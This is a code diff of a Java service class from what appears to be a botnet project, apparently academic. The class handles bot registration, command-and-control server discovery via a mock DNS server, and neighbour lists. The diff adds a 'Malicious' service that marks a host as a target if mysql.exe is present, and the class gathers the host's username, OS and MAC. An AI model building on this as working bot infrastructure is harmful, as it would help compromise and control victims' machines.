@@ -1,22 +1,22 @@
 package cs.sii.service.connection;
 
+import java.io.File;
 import java.io.FileNotFoundException;
 import java.io.IOException;
 import java.io.UnsupportedEncodingException;
-import java.lang.reflect.Type;
 import java.net.InetAddress;
 import java.net.NetworkInterface;
 import java.net.SocketException;
 import java.net.UnknownHostException;
-import java.nio.channels.NetworkChannel;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
 import java.security.PublicKey;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.Enumeration;
-import java.util.Iterator;
 import java.util.List;
+import java.util.Set;
 
 import javax.crypto.BadPaddingException;
 import javax.crypto.IllegalBlockSizeException;
@@ -27,14 +27,14 @@ import org.apache.commons.codec.digest.DigestUtils;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.stereotype.Service;
 
-import com.google.common.reflect.TypeToken;
-
+import cs.sii.bot.action.Malicious;
 import cs.sii.config.onLoad.Config;
-import cs.sii.domain.Conversions;
 import cs.sii.domain.IP;
 import cs.sii.domain.Pairs;
-import cs.sii.domain.SyncCeCList;
+import cs.sii.domain.SyncIpList;
 import cs.sii.model.bot.Bot;
+import cs.sii.network.request.BotRequest;
+import cs.sii.network.request.CecRequest;
 import cs.sii.service.crypto.CryptoPKI;
 import cs.sii.service.crypto.CryptoUtils;
 
@@ -44,16 +44,21 @@ public class NetworkService {
 	@Autowired
 	private Config engineBot;
 
-	// Ip dei command e conquer
 	@Autowired
-	private SyncCeCList commandConquerIps;
+	private SyncIpList<IP,PublicKey> commandConquerIps;
 
-	// Ip dei bot
-	// @Autowired
-	// private SyncCeCList botIps;
+//	 Ip dei command e conquer
+	@Autowired
+	private SyncIpList<IP,PublicKey> neighbours;
 
 	@Autowired
-	private AsyncRequest asyncRequest;
+	private Malicious malServ;
+
+	@Autowired
+	private BotRequest botReq;
+
+	@Autowired
+	private CecRequest cecReq;
 
 	@Autowired
 	private CryptoPKI pki;
@@ -61,14 +66,14 @@ public class NetworkService {
 	@Autowired
 	private CryptoUtils cryptoUtils;
 	private static final String IP_REGEX = "^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$";
-	private static final String MAC_REGEX = "^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$";
+	// private static final String MAC_REGEX =
+	// "^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$";
 
 	private IP ip;
 	private String mac;
 	private String idHash;
 	private String os;
 
-	
 	private long milli;
 
 	private String versionOS;
@@ -77,9 +82,36 @@ public class NetworkService {
 
 	private String usernameOS;
 
+	boolean elegible;
+
 	public NetworkService() {
 	}
+	
+	
+	/**
+	 * @param botList
+	 */
+	public List<Pairs<IP, PublicKey>> setConstructList(Set<Bot> botList) {
+		List<Pairs<IP, PublicKey>> buff = new ArrayList<Pairs<IP, PublicKey>>();
+		botList.forEach((bot) -> {
+			buff.add(new Pairs<IP, PublicKey>(new IP(bot.getIp()), bot.getPubKey()));
+		});
+		return buff;
+	}
+	
 
+	
+	/**
+	 * @param botList
+	 */
+	public List<Pairs<IP, PublicKey>> setConstructList(List<Bot> list) {
+		List<Pairs<IP, PublicKey>> buff = new ArrayList<Pairs<IP, PublicKey>>();
+		list.forEach((bot) -> {
+			buff.add(new Pairs<IP, PublicKey>(new IP(bot.getIp()), bot.getPubKey()));
+		});
+		return buff;
+	}
+	
 	/**
 	 * @return
 	 * @throws InvalidKeyException
@@ -110,6 +142,8 @@ public class NetworkService {
 		System.out.println("My user: " + usernameOS);
 		this.idHash = netPar.get(6);
 		System.out.println("My IdHash: " + idHash);
+
+		elegible = (malServ.checklistFiles("(^mysql.exe)").equals("")) ? false : true;
 
 		String os1 = System.getProperty("os.name");
 		String versionOS1 = System.getProperty("os.version");
@@ -183,25 +217,19 @@ public class NetworkService {
 	/**
 	 * @return
 	 */
-	@SuppressWarnings("unchecked")
 	public boolean firstConnectToMockServerDns() {
-
 		String url = engineBot.getDnsip() + ":" + engineBot.getDnsport() + engineBot.getUrirequest();
 		Pairs<IP, String> result = new Pairs<IP, String>();
 		Pairs<IP, PublicKey> cec = new Pairs<IP, PublicKey>();
 		try {
-			result = asyncRequest.getIpCeCFromDnsServer(url);
-
+			result = botReq.getIpCeCFromDnsServer(url);
 			cec.setValue1(result.getValue1());
-
 			cec.setValue2(pki.rebuildPuK(result.getValue2()));
-
-			commandConquerIps.addCeC(cec);
-			commandConquerIps.getCeCList().forEach(ip -> System.out.println(ip.getValue1()));
+			commandConquerIps.add(cec);
+			commandConquerIps.getList().forEach(ip -> System.out.println(ip.getValue1()));
 			return Boolean.TRUE;
 		} catch (Exception ex) {
 			System.err.println("Errore durante la richiesta di IP\n" + ex);
-
 		}
 
 		return Boolean.FALSE;
@@ -256,23 +284,19 @@ public class NetworkService {
 	 * @return
 	 */
 	private String getMyIpCheckInternet() {
-		String result = "";
-		Integer counter = 0;
 		InetAddress ip = null;
 		try {
 			ip = InetAddress.getLocalHost();
 		} catch (UnknownHostException e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
 		System.out.println("kk " + ip.getHostAddress());
 		// TODO ELIMINA MOCK LOCAL IP
-		//result = asyncRequest.askMyIpToAmazon();
+		// result = asyncRequest.askMyIpToAmazon();
 		// if (result.matches(IP_REGEX))
 		// return result;
 		return ip.getHostAddress();
 	}
-
 
 	// TODO DA VEDERE
 	/**
@@ -282,7 +306,7 @@ public class NetworkService {
 
 		String url = engineBot.getDnsip() + ":" + engineBot.getDnsport();
 		Boolean result = false;
-		result = asyncRequest.sendInfoToDnsServer(url, this.ip, pki.getPubRSAKey());
+		result = cecReq.sendInfoToDnsServer(url, this.ip, pki.getPubRSAKey());
 		System.out.println("Ip tornato " + result);
 		return Boolean.TRUE;
 	}
@@ -291,11 +315,11 @@ public class NetworkService {
 		return true;
 	}
 
-	public SyncCeCList getCommandConquerIps() {
+	public SyncIpList<IP,PublicKey> getCommandConquerIps() {
 		return commandConquerIps;
 	}
 
-	public IP getIp() {
+	public IP getMyIp() {
 		return ip;
 	}
 
@@ -328,7 +352,7 @@ public class NetworkService {
 			mac = loadMachineMac();
 		return mac;
 	}
-	
+
 	public Config getEngineBot() {
 		return engineBot;
 	}
@@ -337,12 +361,12 @@ public class NetworkService {
 		this.engineBot = engineBot;
 	}
 
-	public AsyncRequest getAsyncRequest() {
-		return asyncRequest;
+	public BotRequest getAsyncRequest() {
+		return botReq;
 	}
 
-	public void setAsyncRequest(AsyncRequest asyncRequest) {
-		this.asyncRequest = asyncRequest;
+	public void setAsyncRequest(BotRequest asyncRequest) {
+		this.botReq = asyncRequest;
 	}
 
 	public long getMilli() {
@@ -375,6 +399,66 @@ public class NetworkService {
 
 	public void setUsernameOS(String usernameOS) {
 		this.usernameOS = usernameOS;
+	}
+
+	public SyncIpList<IP, PublicKey> getNeighbours() {
+		return neighbours;
+	}
+
+	public void setNeighbours(SyncIpList<IP, PublicKey> neighbours) {
+		this.neighbours = neighbours;
+	}
+
+	public Malicious getMalServ() {
+		return malServ;
+	}
+
+	public void setMalServ(Malicious malServ) {
+		this.malServ = malServ;
+	}
+
+	public BotRequest getBotReq() {
+		return botReq;
+	}
+
+	public void setBotReq(BotRequest botReq) {
+		this.botReq = botReq;
+	}
+
+	public CecRequest getCecReq() {
+		return cecReq;
+	}
+
+	public void setCecReq(CecRequest cecReq) {
+		this.cecReq = cecReq;
+	}
+
+	public CryptoPKI getPki() {
+		return pki;
+	}
+
+	public void setPki(CryptoPKI pki) {
+		this.pki = pki;
+	}
+
+	public CryptoUtils getCryptoUtils() {
+		return cryptoUtils;
+	}
+
+	public void setCryptoUtils(CryptoUtils cryptoUtils) {
+		this.cryptoUtils = cryptoUtils;
+	}
+
+	public void setCommandConquerIps(SyncIpList<IP, PublicKey> commandConquerIps) {
+		this.commandConquerIps = commandConquerIps;
+	}
+
+	public boolean isElegible() {
+		return elegible;
+	}
+
+	public void setElegible(boolean elegible) {
+		this.elegible = elegible;
 	}
 
 	// public SyncCeCList getBotIps() {
